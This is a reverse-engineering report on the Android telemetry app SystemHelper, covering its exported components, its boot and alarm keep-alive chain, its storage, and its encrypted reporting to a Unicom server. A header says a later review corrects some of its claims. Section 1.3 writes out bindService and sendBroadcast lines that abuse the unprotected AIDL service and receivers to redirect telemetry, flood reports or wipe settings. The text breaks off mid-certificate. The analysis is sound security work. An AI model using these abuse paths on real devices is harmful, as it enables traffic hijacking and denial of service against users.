> **Historical analysis with subsequent corrections.** Read the [final review](../REPORT.md) first. The review narrows or corrects earlier claims about MD5-derived keys, full installed-app inventories, the reachability of privacy notices, one-second upload intervals, timestamps, and confirmed replay. Some OEM branches remain outside the follow-up review. Local identity paths and actual user data are excluded.

# SystemHelper 1.2 (com.mobiletools.systemhelper) — Application Shell/Tool Layer/Resource Reverse Analysis

- Sample: `[LOCAL_PATH_REMOVED]`
- Version: 1.2-20230925-U, versionCode 3, minSdk 24, targetSdk 28, compileSdk 33
- Package name `com.mobiletools.systemhelper`, `sharedUserId=com.mobiletools.systemhelper.uid`, `sharedUserMaxSdkVersion=32`
- `usesCleartextTraffic=true`，`allowBackup=false`，`extractNativeLibs=false`
- Source code baseline: apktool decompilation directory `analysis\SystemHelper\apktool\` (read-only, no modifications were made)
- Description of division of labor: `e0/*` (85 collectors), `e0/r` base class, `e0/c2` configuration scheduling, `d0/*` (reporting thread) were analyzed by others, and this article is only quoted at their calling boundaries.

---

## 1. Component list and call graph (including exported risks)

### 1.1 List (AndroidManifest.xml:16-48)

| components | Type | exported | intent-filter/permissions | Notes |
|---|---|---|---|---|
| `com.mobiletools.systemhelper.Activity.TestActivity` | Activity | **true** | action `com.mobiletools.systemhelper.activity.testactivity` + category DEFAULT | Only UI page; permissions guide + debug text |
| `com.mobiletools.systemhelper.control.DMApplication` | Application | — | — | Process startup hook |
| `com.mobiletools.systemhelper.control.OnBootReceiver` | Receiver | **true** | `BOOT_COMPLETED`, `QUICKBOOT_POWERON`, **`android:priority="2147483647"` (int maximum value)** | The “master switch” for self-starting + timing links |
| `com.mobiletools.systemhelper.control.ScheduleRegisterReceiver` | Receiver | false (not explicitly declared) | No filter | Only triggered by own alarm (reported periodically) |
| `com.mobiletools.systemhelper.control.AppInfoRegisterReceiver` | Receiver | false | No filter | Only called by own alarm (reported to application list) |
| `com.mobiletools.systemhelper.control.SIMStateReceiver` | Receiver | **true** | `android.intent.action.SIM_STATE_CHANGED` | Dual registration: one static list + one copy dynamic at runtime |
| `com.mobiletools.systemhelper.control.ConnectStateReceiver` | Receiver | **true** | `android.net.conn.CONNECTIVITY_CHANGE` | Static + dynamic dual registration, only logging |
| `com.mobiletools.systemhelper.service.RegisterHelperService` | Service | **true** | action `com.mobiletools.systemhelper.service.IRegisterHelperService`, **None `android:permission`** | AIDL cross-process "remote control port", **the most serious risk point** |
| `com.mobiletools.systemhelper.service.RegisterIntentService` | IntentService | false | — | Bind OEM private phone service + trigger reporting |
| `com.mobiletools.systemhelper.service.RegisterJobService` | JobService | false | `android:permission="android.permission.BIND_JOB_SERVICE"` | **is not called in the whole project JobScheduler/JobInfo → dead component** |

The manifest also declares `<permission android:name="com.mobiletools.systemhelper.permission" android:protectionLevel="signature"/>`, but no component in the entire **project uses this permission** (the `android:permission` attribute does not reference it), which is a typical problem of "it is declared but not used to protect itself".

### 1.2 Call graph (component → tool layer → reporting)

```
BOOT_COMPLETED / QUICKBOOT_POWERON
   └─ OnBootReceiver.onReceive
        ├─ f0/l.c("preference_enable_log", false) → f0/f.a (log master switch)
        ├─ [SDK>=30] e0/r.k(ctx) (Collector initialized, others are analyzing)
        └─ action∈{BOOT_COMPLETED, QUICKBOOT_POWERON}
             ├─ f0/a.b(ctx, 240000ms) → PendingIntent→OnBootReceiver (will wake up after 4 minutes)
             ├─ f0/a.d(ctx, scheduleInterval=24h) → ScheduleRegisterReceiver
             └─ f0/a.a(ctx, appInfoInterval=7d)   → AppInfoRegisterReceiver

(4 minutes later) OnBootReceiver.onReceive(action=null) ← else branch
   ├─ new SIMStateReceiver().b(ctx) → registerReceiver(SIM_STATE_CHANGED) dynamic registration (f0/f.u=true first swallow event)
   ├─ new ConnectStateReceiver().b(ctx) → registerReceiver(CONNECTIVITY_CHANGE) dynamic registration (f0/f.v=true first swallow event)
   ├─ [Network connected && simState==5(READY) && SDK>=30 && f0/f.t>=0]
   │     ├─ f0/f.t--(initial value 2)
   │     └─ If f0/f.n and f0/f.o are empty → f0/a.b(ctx, 3000ms) will wake up after re-hanging for 3 seconds; return
   ├─ e0/c2.i() + e0/c2.h(ctx) → Get the operator/model configuration object (z0/c0/e0 branch)
   ├─ firstPowerOn(prefs) non-null ? RegType="B" : RegType="F" (and write back firstPowerOn="firstPowerOn")
   └─ Branch:
        OEM branch (e0/z0 | e0/c0 | e0/e0) → startService(RegisterIntentService{RegType=B|F})
        Others → d0/g.b(ctx, "B"|"F") (report directly to the thread)

ScheduleRegisterReceiver (once every 24h)
   ├─ [SDK>=30] e0/r.k(ctx)
   ├─ f0/a.d(ctx, scheduleInterval) ← Self-renewal, forever 24h
   ├─ RegType="S" → RegisterIntentService or d0/g.b(ctx,"S")
   └─ [SDK>=31] e0/r.s(ctx) (Second application for permission, others are analyzing it)

AppInfoRegisterReceiver (7d once)
   ├─ f0/a.a(ctx, appInfoInterval) ← self-renew, forever 7d
   ├─ RegType="A" → RegisterIntentService or d0/g.b(ctx,"A")
   └─ [SDK>=31] e0/r.s(ctx)

SIMStateReceiver.onReceive (dynamic registration instance + manifest static instance)
   ├─ action==SIM_STATE_CHANGED:
   │    ├─ state==1(ABSENT) && SDK>=30 → e0/r.s(ctx); clear f0/f.n/f0/f.o
   │    ├─ [SDK>=30] e0/r.k(ctx)
   │    └─ f0/a.c(ctx, 360000ms) → Return to SIMStateReceiver after 6 minutes (action=null)
   └─ action!=SIM_STATE_CHANGED (null action including alarm):
        └─ RegType="T" → RegisterIntentService or d0/g.b(ctx,"T")

ConnectStateReceiver.onReceive → Only f0/l.l(ctx) determines connectivity and logs, no collection action

TestActivity.onCreate
   ├─ setContentView(R.layout.activity_test)
   ├─ f0/l.c("preference_enable_log", false) → f0/f.a
   ├─ [SDK>=30] e0/r.k(ctx)
   ├─ Check READ_PHONE_STATE / ACCESS_COARSE_LOCATION / ACCESS_NETWORK_STATE
   │    All → B(); missing any → android.support.v4.app.a.f(this, perms, 1) Apply
   └─ onRequestPermissionsResult(1, …): All three granted → B(), otherwise finish()
B()  ├─ findViewById(R.id.tv_device_info)
     ├─ OEM branch (z0/c0/e0) → startService(RegisterIntentService) (without RegType → d0/g.a(ctx))
     └─ Others → tv.setText(d0/g.c(ctx)) (local cache/device information string)
```

### 1.3 exported risk points (item by item)

1. **`RegisterHelperService`（service/RegisterHelperService.smali:41-55，service/a$a.smali:41-146）**
   `android:exported="true"` and **do not have permission to protect**, with intent-filter (can be implicitly bound). for any third party application
   `bindService(new Intent("com.mobiletools.systemhelper.service.IRegisterHelperService").setPackage("com.mobiletools.systemhelper"), conn, BIND_AUTO_CREATE)`
   You can get Binder and call 5 methods (see §1.4). Consequences: Rewrite the reporting server address, rewrite the reporting cycle, switch log, **deletes the entire prefs file**.
2. **`TestActivity` (Activity/TestActivity.smali)** exported + custom action → Any application can pull it up at any time; it will automatically pop up `READ_PHONE_STATE` / Positioning / `ACCESS_NETWORK_STATE` Three sensitive permission requests (targetSdk 28, the pop-up window style is a system permission box), which is a phishing surface that can be defrauded by third parties to obtain authorization through "backdooring". After granting, `RegisterIntentService` will also be started to trigger a report.
3. **`OnBootReceiver`** exported: `BOOT_COMPLETED` is a protected broadcast (ordinary applications cannot be forged), but **explicit component calls are not intercepted** - any application `sendBroadcast(new Intent().setClassName("com.mobiletools.systemhelper","…OnBootReceiver"))` (action is null or customized) will go else Branch: Register two dynamic broadcast receivers, initialize collector configuration, and immediately trigger a report of RegType=B/F. Can be used to amplify traffic/detect application presence.
4. **`SIMStateReceiver`** exported: Forge `SIM_STATE_CHANGED` (this action is not a protected broadcast and can be sent by third parties) to make it enter the "Waiting for SIM ready" branch, repeatedly hang the alarm for 6 minutes and call `e0/r.s` (permission re-application); when sending other actions, directly use RegType="T" to report.
5. **`ConnectStateReceiver`** exported: Fake `CONNECTIVITY_CHANGE` only triggers the log, which is low-harm (but can be used to detect the installation status).
6. Although **`RegisterJobService`** contains `BIND_JOB_SERVICE`, there are no references to `JobScheduler`/`JobInfo` in the whole project (confirmed by global grep). This version is dead code.

### 1.4 AIDL capability surface (service/a, service/a$a, RegisterHelperService$a)

Interface descriptor: `com.mobiletools.systemhelper.service.IRegisterHelperService` (a$a.smali:26).
`onTransact` transaction code: 1→`r(String)`, 2→`i(int)`, 3→`u()`, 4→`s(boolean)`, 5→`o()Z` (in addition `0x5F4E5446`=INTERFACE_TRANSACTION returns the descriptor).

| method | real semantics | Drop point (key/file) | Consequences of abuse |
|---|---|---|---|
| `r(String)` | Set reporting server address | `f0/l.t(ctx,s)` → prefs `serverAddress` | **redirects all telemetry traffic to the attacker server** (coupled with plaintext HTTP to completely steal/forge reports) |
| `i(int)` | Set three periods proportionally to 1 integer | `scheduleInterval = n`; `appInfoInterval = n*8/5`; `signalInfoInterval = n*9/5` (integer division, RegisterHelperService$a.smali:34-76) | Change 24h to 1s → high-frequency reporting, consuming power/traffic/exploding the server |
| `o()` | Read log switch | prefs `preference_enable_log` | Information leakage detection (whether to enable debugging logs) |
| `s(boolean)` | Log writing switch | `f0/f.a` + prefs `preference_enable_log` | Open debugging log → logcat leaks device information/reports clear text |
| `u()` | Delete preference file | `f0/l.a()`：`File.delete("/data/data/com.mobiletools.systemhelper/shared_prefs/com_mobiletools_systemhelper_preference.xml")` | DoS: clear firstPowerOn/period/server address and return to default configuration |

Note: `f0/l` all uses `getSharedPreferences(name, 4)`, that is, **MODE_MULTI_PROCESS** (obsolete). Cross-process reading and writing do not guarantee consistency; `u()` directly deletes files without clearing the memory cache, which is an unstable implementation.

---

## 2. Start/keep-alive chain (including all cycle values)

| link | trigger | action | Period/Delay (hex → decimal) |
|---|---|---|---|
| Power on | `BOOT_COMPLETED`、`QUICKBOOT_POWERON`（priority=2147483647） | Read log switch, `e0/r.k`, hang 3 alarms | `0x3A980` = **240000 ms = 4 minutes** (self-wakeup) |
| Regular reporting | `ScheduleRegisterReceiver` | RegType=`S`, self-renewal | `0x5265C00` = **86400000 ms = 24 hours** (`f0/f.y`, can be modified by AIDL) |
| Application list reporting | `AppInfoRegisterReceiver` | RegType=`A`, self-renewal | `0x240C8400` = **604800000 ms = 7 days** (`f0/f.z`, can be modified by AIDL) |
| SIM ready and waiting | After `SIM_STATE_CHANGED` | Hang alarm back to SIMStateReceiver | `0x57E40` = **360000 ms = 6 minutes** |
| SIM/Network type not ready try again | OnBootReceiver else branch | Re-hook self-wake up alarm | `0xBB8` = **3000 ms = 3 seconds**, up to 3 times (the initial value of `f0/f.t` is 2, and it will decrease after judging `>=0` → 2,1,0) |
| Exit IP query | Before reporting | `f0/e.a()` GET `…/public/ip` | Connect/read timeout each `0xBB8` = 3000 ms |
| Report POST | `f0/g.c()` | See §3.7 | Connect `0x2710`=10000 ms, read `0x3A98`=15000 ms |
| Signal reporting cycle | Only AIDL can be written | prefs `signalInfoInterval` | The default **has no reader**, and there is no default value at the factory. |

Key points:

- `f0/a.e()` and `f0/a.f()` are the pile functions **of** that always return true, so all four alarms go to `AlarmManager.setExactAndAllowWhileIdle(2, elapsedRealtime()+delay, pi)`: type 2 = `ELAPSED_REALTIME_WAKEUP`, which is accurate and can be woken up under Doze. The `set()`/`setExact()` code of the `else` branch is short-circuited by the "constant true" during compilation and is an unreachable dead branch (f0/a.smali:275-289).
- PendingIntent flags are always `0xC000000` = `FLAG_UPDATE_CURRENT | FLAG_IMMUTABLE`, requestCode is always 0 → multiple alarms of the same receiver will cover each other (there is only one of the same PendingIntent).
- **does not have any setRepeating**: each link depends on the receiver to "hang up again during processing", so it will be re-seeded by BOOT after restart to form a sustainable chain; `SCHEDULE_EXACT_ALARM` has been declared in the manifest (granted by default under targetSdk 28).
- The first run is determined by prefs `firstPowerOn`: empty → RegType=`F` and `"firstPowerOn"="firstPowerOn"` is written back at the end; not empty → RegType=`B`.
- `DMApplication.onCreate` (control/DMApplication.smali:17-37) directly adjusts `e0/r.k(ctx)` when **SDK≥30**, that is, "any process will initialize the collector when it is started" and does not rely on the UI.
- `RegisterJobService` is not scheduled by any code, and there is no JobInfo cycle/constraint to talk about (dead component).

---

## 3. Class-by-class description of f0 tool layer

### 3.1 `f0/l` — SharedPreferences package (19.6 KB, core)

- Preferred file name: **`com_mobiletools_systemhelper_preference`** → Drop `/data/data/com.mobiletools.systemhelper/shared_prefs/com_mobiletools_systemhelper_preference.xml` (the absolute path is hard-coded in `f0/l.a()`, f0/l.smali:39).
- The open mode is always `4` (`MODE_MULTI_PROCESS`); `commit()` is used for writing (synchronous disk placement), and `getXxx` is used for reading.
- Method semantics: `c/q`=boolean read/write, `e/r`=long read/write, `h/v`=String read/write, `b/f/g`=three business default values read, `p/s/t/u`=three cycles + convenient writing of server address, `d()`=timestamp `yyyy-MM-dd HH:mm:ss` (`SimpleDateFormat`, Locale.getDefault), `i/j/k`=**reflection `android.os.SystemProperties.get`** (1 parameter / 2 parameters / with "unknown" `l()`=`ConnectivityManager.getActiveNetworkInfo().isConnected()`, `o()`=Wi-Fi(`TYPE_WIFI=1`) Whether CONNECTED, `m(d0/g)`=`DataSlot`+`NetworkOperator` Determine **China Unicom card (46001/46006/46009)**, `n(String)` = pure string version of the same.
- **complete key table** (full project grep cross-validation, only these 8 keys + 4 collector cache keys):

| key | Type | Default value | Read/Write API | Semantics |
|---|---|---|---|---|
| `appInfoInterval` | long | `0x240C8400`=604800000 (7 days) | `b()` / `p()`、AIDL `i()`（=n*8/5） | Application list reporting cycle |
| `scheduleInterval` | long | `0x5265C00`=86400000 (24 hours) | `f()` / `s()`、AIDL `i()`（=n） | Regular reporting cycle |
| `signalInfoInterval` | long | No default read (write only) | — / `u()`、AIDL `i()`（=n*9/5） | Signal reporting cycle (no consumer in this version) |
| `serverAddress` | String | `http://dm.wo.com.cn:18080/registerv3` | `g()` / `t()`、AIDL `r()` | Report URL (**plain text HTTP**) |
| `preference_enable_log` | boolean | `false` | `c()` / `q()`、AIDL `s()` | Log master switch → `f0/f.a` |
| `firstPowerOn` | String | `""` | `h()` / `v()` | First startup mark; if not empty, use RegType=`B` instead |
| `CellID0`、`CellID1`、`LAC0`、`LAC1` | String | `""` | `h()` (`e0/r` read, 14 in total) | Cell cache (write on collector side) |
| `iccid1`、`iccid2` | String | `""` | `h()` / `v()` (Written in 2 places each) | Two cards ICCID cache |

> Conclusion: **does not have** deviceId/IMEI/upload time/URL list type keys - device identification and business data do not fall into prefs, and all go through the memory bean (`d0/g`) and SQLite buffering. Therefore, there is only one "telemetry switch" (`preference_enable_log` is the **log** switch, not the collection switch; the main collection switch is the memory static quantity `f0/f.g`, the default is `true`).

### 3.2 `f0/d` — SQLiteOpenHelper (library `systemhelper`, table `history`)

- Library name `systemhelper`, version `1` (`f0/d.b`), table name `history` (`f0/d.d`).
- Create table: `create table history(id integer primary key autoincrement, jsonString text)` (f0/d.smali:496); `onUpgrade` empty implementation (no migration).
- Singleton: `b(Context,String,int)` lock + `AtomicInteger` count; `close()` singleton is empty only when the count returns to zero.
- Write `c(String json)` (f0/d.smali:140-235): First `query` takes `count` from the whole table, **if `count >= 100（0x64）`** then `moveToFirst()` takes the `jsonString` value of the earliest row, use `delete where jsonString=?` **Delete the** by value (not by id! If the two jsons are exactly the same, multiple ones will be deleted at once), and then `insert`. → Capacity upper limit **100**, FIFO semantics but implementation deviation.
- Read: `d()` normal query → `JSONArray`; `e()` has the same logic but uses `CursorWindow("queryWindow", 0x1400000=20 MB)` to increase the load of large results (d0/k switches according to the number threshold, `d0/k.smali:~120`).
- Cleanup: `a()` = `delete from history` (no where), clear all.
- Caller (`d0/k` = reporting thread): Success → Clear `a()` (`d0/k.smali:327`); Failure → Set `d0/g.M` (history array field) to null first to avoid repeated carrying, and then drop `c(json)` and try again (`d0/k.smali:356/528/560/631`). → **history is the disconnection/failure retry queue**.

### 3.3 `f0/m` — SQLiteOpenHelper (library `signalhelper`, table `signal`)

- Library name `signalhelper`, version 1, table name `signal`; create table `create table signal(id integer primary key autoincrement, jsonString text)` (f0/m.smali:272), enter an extra `SignalDatabaseHelper onCreate-->` log in `onCreate` (**, please note that TAG is inconsistent with the class name**).
- Only `a(ctx,String,int)` (single case) and `b()` (full table → `JSONArray`, 20 MB CursorWindow) are provided. **has no insert method, and there is no code in the entire project to write data** to the signal table (the call points of `Lf0/m;->` are only `d0/f`, `d0/j` instances and `b()`).
- Current situation: `d0/j` (SDK≥28) inserts the result `String.valueOf()` of `b()` into `d0/g.N`; when the table is empty, it returns the `null` → `"null"` string into the report body. **belongs to the "reserved but not enabled" signal history table**.

### 3.4 `f0/a` — Alarm static package

- `a(ctx,delay)`→`AppInfoRegisterReceiver`；`b(ctx,delay)`→`OnBootReceiver`；`c(ctx,delay)`→`SIMStateReceiver`；`d(ctx,delay)`→`ScheduleRegisterReceiver`。
- The four method bodies are completely isomorphic: `PendingIntent.getBroadcast(ctx, 0, new Intent(ctx, X.class), 0xC000000)` + `AlarmManager.setExactAndAllowWhileIdle(2, elapsedRealtime()+delay, pi)` (`e()`/`f()` are always true, see §2).
- Note: `f0/a.b()` is used for both "self-wake up 4 minutes after power on" and "SIM not ready, retry for 3 seconds". Both share the same PendingIntent (requestCode 0 + the same component), and **will overwrite each other**.

### 3.5 `f0/b` — Application Information JSON bean

fields (`g=-1` when constructed, the rest 0): `a`=pkgName, `b`=appLabel, `c`=runTime(min), `d`=totalData1, `e`=totalData2, `f`= totalDataWiFi, `g`=serial number (int), `h`=tx1, `i`=rx1, `j`=tx2, `k`=rx2, `l`/`m`=unserialized two long.
`a()` → `JSONObject`: `appLabel`, `pkgName`, `runTime`=`"<n>min"`, `tx1/rx1/tx2/rx2`=`"<n>KB"`, `totalData1`/`totalData2`=`"<n>KB"`, `totalDataWiFi`=`"<n>MB"` (mixed units KB/MB, string concatenation). `b()` → `g`.
Setter mapping (error-prone points): `c()` → `b` (appLabel), `d()` → `a` (pkg), `e()` → `c` (runTime), `f()` → `i` (rx1), `g()` → `k` (rx2), `h()` → `m`, `i()` → `d` (totalData1), `j()` → `e` (totalData2), `k()` → `f` (wifi), `l()` → `h` (tx1), `m()` → `j` (tx2), `n()` → `l`, `o()` → `g` (serial number).

### 3.6 `f0/c` / `f0/k` — Encryption and decryption

- `f0/c.a(String,[B)`: `AES/ECB/PKCS5Padding` encryption (key = incoming byte, key length is 16/24/32), plaintext `getBytes("utf-8")`; after exception `printStackTrace`, return `null` (silent failure).
- `f0/c.b([B)`: `Base64.encodeToString(b, 0, len, 0)` (flags=0 means `Base64.DEFAULT`. According to Android semantics, a line break is inserted every 76 characters, with `\n` at the end; the caller then does `URLEncoder`, so `%0A` line breaks will appear in `sign`, indicating that the implementation is rough).
- `f0/c.c(Context,[B)`: Read `assets/pub.cer` → `f0/k.b(InputStream)` and get the public key → `f0/k.a(Key,[B)` and do `RSA/ECB/PKCS1Padding` encryption.
- `f0/c.d(String)`：MD5（`MessageDigest("MD5")`，UTF-8）。
- `f0/k`: `b()` uses `CertificateFactory.getInstance("X.509").generateCertificate()` to get `getPublicKey()`; `a()` uses `RSA/ECB/PKCS1Padding`, either private key or public key can be used (for `Cipher.ENCRYPT_MODE`, only the public key is used). The 16-element hexadecimal character table `a[16]` (`"0123456789abcdef"`) remains in the class, **is not used (residual code)**.
- Defect tip: **signature/encryption keys are derived from the plaintext itself** (see §3.7), `AES` key = `MD5(plaintext)`, which is equivalent to no confidentiality; `RSA` is only used to wrap this MD5, and its function is to "let the operator holding the private key verify", not to keep the client confidential.

### 3.7 `f0/g` — HTTPS/HTTP POST packaging and reporting contract

Method `c(String url, byte[] body, byte[] unused)Z` (**is completely unused after the third parameter is overwritten by local variables and** is not used):

- `POST`，`connectTimeout=10000`，`readTimeout=15000`，`doOutput=doInput=true`；
- Request header: `Content-Type: application/encrypted-json`, `Content-Length: <body length>`;
- Response: `respCode==200` → Call `Log.d("HttpEncryptHelper","register success!")` and return `true`; otherwise `f0/j.b("HttpEncryptHelper","register fail!")` returns `false`; `b()` returns the latest status code; `a()`=disconnect.
- The caller `d0/k` additionally treats **HTTP 416 (`0x1A0`) as successful** (considered "registered").

**complete request contract** (the only call point `d0/k.smali:150-270`):

```
plaintext = d0/g.d() # JSON string of device/card/application list
md5 = MD5(plaintext) # 16 bytes, f0/c.d
sign      = URLEncode( Base64( RSA_PKCS1_pub.cer(md5) ) )     # f0/c.c + f0/c.b
body      = AES/ECB/PKCS5( plaintext, key = md5 )            # f0/c.a
url       = <prefs.serverAddress> + "?ver=3.0&model=" + URLEncode(Build.MODEL)
                                 + "&manuf=" + URLEncode(Build.MANUFACTURER)
                                 + "&sign="  + sign
POST url, body → 200 (or 416) is considered successful
```

`serverAddress` defaults to `http://dm.wo.com.cn:18080/registerv3` (`ver=3.0` is hardcoded in `d0/k`). The default address belongs to **China Unicom (wo.com.cn)**, `dm` = device management, `:18080` is a non-standard plain text port.

### 3.8 `f0/e` — Exit IP Query

`a()`: `GET http://dm.wo.com.cn:18080/public/ip` (`f0/f.x`), connect/read 3000 ms each, `useCaches=false`, identify `Content-Encoding: gzip` and decompress, read `trim()` line by line and return; if it is not 200, log `getResponseMessage()` and return `null`. Unique caller `d0/h.b()`: Check only when "network is connected". The result is **IPv4 external network address** (`d0/h.e`) as the reporting body, and the local address is filled in by `a()`.

### 3.9 `f0/h` — MD5 hexadecimal

`a(String)`: MD5 → byte by byte `Integer.toHexString` zero padding → `toLowerCase()`; the input parameter is `null`/empty string and returns `""` directly. In the abnormal branch, `MessageDigest` may be null and then continue `digest()` → potential NPE (`f0/h.smali:80`).

### 3.10 `f0/i` — MemoryUtils (memory/storage capacity)

- `a()`: `freeBlocks*blockSize / 1024^3` of `StatFs(Environment.getDataDirectory())` rounded → `"<n>G"` (FREE).
- `b()`: Read `/proc/meminfo_memsize` (only available in some domestic ROM) and parse `memsize`, go to `kB`, convert to GB, `ceil` → `"<n>G"`.
- `d()`: Read the first line of `/proc/meminfo` `MemTotal:`, go to `kB`, transfer to GB, `ceil`.
- `e()`: `blockCount*blockSize/1024^3`, raised to the power of **2** (`2^n`) → `"<n>G"` (ROM).
- `c()`: `{"RAM":…,"ROM":…,"FREE":…}`, fill in the blank value with `"Unknown"`.
- `f(String path)`: General `key: value` text → `HashMap` (`Scanner`, `split(":")` must be exactly 2 paragraphs).

### 3.11 `f0/j` — Log

- Two static switches **are connected in series with**: `f0/j.b` (constant `true`, no one changes) + `f0/f.a` (= prefs `preference_enable_log`, default `false`).
- `a(TAG,msg)` → `Log.d`, single > `0xC00`=3072 characters are automatically fragmented; `b(TAG,msg)` → `Log.e` (not fragmented); `c(Context,String)` **empty method body** (`f0/j.smali:120-124`).
- **does not write to the disk, does not report, and has no file log**; it is turned off by factory default. TAG Use string literals (`RegisterUtils`, `HttpEncryptHelper`, `RSAHelper`, `MemoryUtils`, `SignalDatabaseHelper`, `AppInfo`, `RegisterThread`, `RegisterIntentService` , `RegisterHelperService`, `RegisterJobService`, `SIMStateReceiver`, `ConnectStateReceiver`, `ScheduleRegisterReceiver`, `AppInfoRegisterReceiver`, `OnBootReceiver`, `DMApplication`), and another one is written to death `Log.e("TAG","Entering the onbootreceiver")` (OnBootReceiver.smali:30-34) - **ignores the switch and always outputs**.
- Note that `f0/j`'s slicing loop uses `substring(start, end)` and `start` uses the value after the `i*size` variable is overwritten. There is an off-by-one risk in long message slicing (`f0/j.smali:52-70`).

### 3.12 `f0/n` — Three strings POJO

Field `a/b/c`, getter `a()/c()/b()` (note that `b()` returns the `c` field, `c()` returns the `b` field), setter `d()/f()/e()`. The only user is `d0/f` (network type/slot carrier).

### 3.13 `f0/o` — Reflection Tool

`a(String)`→`Class.forName`; `b(Class,String,Class[])`→`getDeclaredMethod`; `c(Method,Object,Object[])`→`setAccessible(true)` + `invoke`; Exceptions will always be `printStackTrace` and `null` will be returned. Used extensively by `e0/*` (`q0`/`x1`/`n0`, etc., hundreds of places each) - **This is the main means to bypass the hidden API restrictions to read system private fields**.

---

## 4. Constant table

### 4.1 Conclusion first: `u/a … u/j` **is not the** protocol constant container, but the `R` class of AppCompat

There are no methods in `method_index.txt` because they are all `int`/`int[]` constant tables of `public final`; after `.field` is fully exported, it is compared with `res/values/public.xml` one by one, and the types are completely consistent (the 231 fields of `u/j` are the subscripts of `R$styleable` + 24 attribute array). The real configuration/protocol constants of **are in `f0/f` (writable static fields) and `d0/g`/`e0/c2` (analyzed by others).**

| class | true identity | Number of fields | range | Notes |
|---|---|---|---|---|
| `u/a` | `R$attr` | 38 | `0x7f02xxxx` | `actionBarSize`(0x7f020003)、`colorAccent`(0x7f020058)、`toolbarStyle`(0x7f0201a5) … |
| `u/b` | `R$bool` | 1 | `0x7f030000` | `abc_action_bar_embed_tabs` |
| `u/c` | `R$color` | 7 | `0x7f04xxxx` | `abc_tint_*`、`abc_input_method_navigation_guard` |
| `u/d` | `R$dimen` | 12 | `0x7f05xxxx` | `abc_action_bar_stacked_max_height`、`tooltip_y_offset_*` … |
| `u/e` | `R$drawable` | 45 | `0x7f06xxxx` | All `abc_*` (AppCompat material) |
| `u/f` | `R$id` | 42 | `0x7f07xxxx` | `action_bar`(0x7f07000b)、`title`(0x7f0700c6)、`topPanel`(0x7f0700cb) … |
| `u/g` | `R$layout` | 20 | `0x7f09xxxx` | All `abc_*`/`support_simple_spinner_dropdown_item` (**does not include** `activity_test`) |
| `u/h` | `R$string` | 12 | `0x7f0bxxxx` | `abc_menu_*_shortcut_label`、`abc_prepend_shortcut_label` … |
| `u/i` | `R$style` | 3 | `0x7f0cxxxx` | `Animation.AppCompat.Tooltip`、`Theme.AppCompat.CompactMenu`、`Theme.AppCompat.Light` |
| `u/j` | `R$styleable` | 231 | Integer subscript + 24 `int[]` | `a[]`, `O[]`, `P[]`, `Q[]`, `R[]`, `V[]`, `E[]`, `F[]`, `a0[]`, `r0[]`, `O0[]` and other attribute sets |

### 4.2 `f0/f` - Application-level configuration/runtime status constants (`f0/f.smali`, all **are not final** and can be overridden by any class)

| Field | Type | initial value | Semantics | written by who |
|---|---|---|---|---|
| `w` | String | `http://dm.wo.com.cn:18080/registerv3` | Default reporting address | None (take prefs override) |
| `x` | String | `http://dm.wo.com.cn:18080/public/ip` | Exit IP query | None |
| `y` | long | `0x5265C00`=86400000 | Default scheduleInterval (24h) | None |
| `z` | long | `0x240C8400`=604800000 | Default appInfoInterval (7d) | None |
| `t` | int | `2` | SIM/Network ready waiting retry count | OnBootReceiver (decremented) |
| `g` | boolean | `true` | Collection master switch | `e0/*` 30+ places |
| `a` | boolean | `false` | Log switch | TestActivity / OnBootReceiver / AIDL `s()` |
| `b`~`e` | boolean | `false` | unused flag bit | None |
| `f` | Context | `null` | Unused static Context | None |
| `h`/`i` | TelephonyManager | `null` | Card Slot TelephonyManager Cache | `e0/*`/`d0/*` |
| `j`/`k` | `d0/e` | `null` | card slot information bean | scope of others |
| `l`/`m` | `d0/f` | `null` | signal bean | scope of others |
| `n`~`s` | String | `""` | `NetworkTypeSlot1/2`, `DataSlot` and other string caches | `e0/*` |
| `u`/`v` | boolean | `false` | SIMState/ConnectState dynamically registers the "first swallowing event" flag | Two Receivers |
| `A` | `b0/a` | `null` | Nubia `INBExtTelephony` Agent | `RegisterIntentService$a` |
| `B` | `c0/a` | `null` | Gree `IGreeTelephonyManager` agent | `RegisterIntentService$b` |

### 4.3 Scattered values/protocol constants

| constant | value | Source |
|---|---|---|
| Power-on self-wake-up delay | `0x3A980` = 240000 ms（4 min） | OnBootReceiver.smali:112 |
| SIM ready and waiting | `0x57E40` = 360000 ms（6 min） | SIMStateReceiver.smali:211 |
| Network/slot retry | `0xBB8` = 3000 ms | OnBootReceiver.smali:280 |
| Report POST connection/read timeout | `0x2710`=10000 / `0x3A98`=15000 | f0/g.smali:86/92 |
| IP query timeout | `0xBB8`=3000 / `0xBB8`=3000 | f0/e.smali:47/53 |
| Log fragment length | `0xC00` = 3072 | f0/j.smali:7 |
| History table upper limit | `0x64` = 100 | f0/d.smali:178 |
| CursorWindow size | `0x1400000` = 20 MB | f0/d.smali:411、f0/m.smali:146 |
| Report version number | `"ver=3.0"` | d0/k.smali |
| Content-Type | `"application/encrypted-json"` | f0/g.smali:116 |
| Registered success code | `0x1A0` = 416 | d0/k.smali |
| China Unicom MCC/MNC | `46001`/`46006`/`46009` | f0/l.smali:422-426、589-613 |
| Thread pool size | 2（`Executors.newFixedThreadPool(2)`） | a/b.smali:37 |
| Cross-process mode | `4`（MODE_MULTI_PROCESS） | f0/l full file |

---

## 5. Resource/Asset Analysis

### 5.1 `assets/pub.cer` (596 bytes, DER/X.509)

```
Length        : 596 bytes
Header        : 30 82 02 50 30 82 01 B9 …（SEQUENCE，len 0x250）
Subject       : CN=UNICOM, OU=UNICOM, O=UNICOM, L=BJ, S=BJ, C=CN
Issuer: CN=UNICOM, OU=UNICOM, O=UNICOM, L=BJ, S=BJ, C=CN ← Self-signed
Serial        : 52 8B 93 60
NotBefore     : 2019-05-24 08:44:27 UTC
NotAfter : 2119-04-30 08:44:27 UTC ← Validity period 100 years
Signature Alg : sha256RSA (1.2.840.113549.1.1.11)
Public Key    : RSA 1024 bit
Version: v3 (only SubjectKeyIdentifier extension: 6D3078…5314)
DER SHA-256   : 810c0122ba6af7a4b6a5921fdbbbf9197fb2e0b2e82de0c5aa40d28f1b7c6501
DER SHA-1     : D81C6EE680DD6A58DD23A8670B064B18B9BD87B1
Subject/Issuer Chinese meaning: China·Beijing·Unicom (UNICOM)
```

PEM：

```
-----BEGIN CERTIFICATE-----
MIICUDCCAbmgAwIBAgIEUouTYDANBgkqhkiG9w0BAQsFADBaMQswCQYDVQQGEwJD
TjELMAkGA1UECBMCQkoxCzAJBgNVBAcTAkJKMQ8wDQYDVQQKEwZVTklDT00xDzAN
